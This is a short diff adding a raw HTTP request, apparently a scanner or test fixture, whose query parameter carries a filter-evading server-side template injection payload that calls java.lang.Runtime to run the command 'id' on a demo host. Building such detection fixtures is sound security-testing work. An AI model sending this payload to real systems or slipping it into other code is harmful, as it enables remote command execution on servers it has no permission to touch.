@@ -1,0 +1,4 @@
+GET /a?input=%23sEt($X%3D"")$x.GeTcLaSs().FoRnAmE("jAvA.lAnG.rUnTiMe").GeTrUnTiMe().ExEc("Id") HTTP/1.1
+Host: demo.example.com
+Connection: close
+
